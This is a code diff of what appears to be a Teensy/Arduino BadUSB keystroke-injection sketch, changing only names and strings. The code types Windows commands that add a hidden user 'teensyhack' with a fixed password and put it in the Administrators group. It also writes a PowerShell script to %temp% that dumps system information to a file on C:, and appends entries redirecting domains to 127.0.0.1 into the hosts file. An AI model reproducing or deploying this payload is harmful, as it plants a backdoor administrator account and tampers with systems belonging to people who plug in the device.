@@ -3,8 +3,8 @@
     #include<usb_private.h>
 #endif
 
-# define U_ADD "net user ddjoe 1qaz@WSX /add"
-# define G_ADD "net localgroup Administrators ddjoe /add"
+# define U_ADD "net user teensyhack 1qaz@WSX /add"
+# define G_ADD "net localgroup Administrators teensyhack /add"
 
 void setup() { 
  delay(3000);
@@ -99,7 +99,7 @@ void dump_info(){
 
   Keyboard.println("echo $o = $o.Replace(\"/\",\"\\\") >> %temp%\\in.ps1");
   Keyboard.println("echo $pv = $o.Replace(\"www\",\"uuu\") >> %temp%\\in.ps1");
-  Keyboard.println("echo add-content c:\\sysInfo.txt $pv  >> %temp%\\in.ps1");
+  Keyboard.println("echo add-content c:\\teensyhack_sysInfo.txt $pv  >> %temp%\\in.ps1");
 
   String fn = "in";
   String fp;
@@ -112,11 +112,11 @@ void dump_info(){
 }
 
 void add_hosts(){
-Keyboard.println("echo 127.0.0.1 www.test1.com >> %systemroot%\\system32\\drivers\\etc\\hosts");
+Keyboard.println("echo 127.0.0.1 www.teensyhack1.com >> %systemroot%\\system32\\drivers\\etc\\hosts");
 delay(500);
-Keyboard.println("echo 127.0.0.1 www.test2.com >> %systemroot%\\system32\\drivers\\etc\\hosts");
+Keyboard.println("echo 127.0.0.1 www.teensyhack2.com >> %systemroot%\\system32\\drivers\\etc\\hosts");
 delay(500);
-Keyboard.println("echo 127.0.0.1 www.test3.com >> %systemroot%\\system32\\drivers\\etc\\hosts");
+Keyboard.println("echo 127.0.0.1 www.teensyhack3.com >> %systemroot%\\system32\\drivers\\etc\\hosts");
 delay(1000);
 }
 
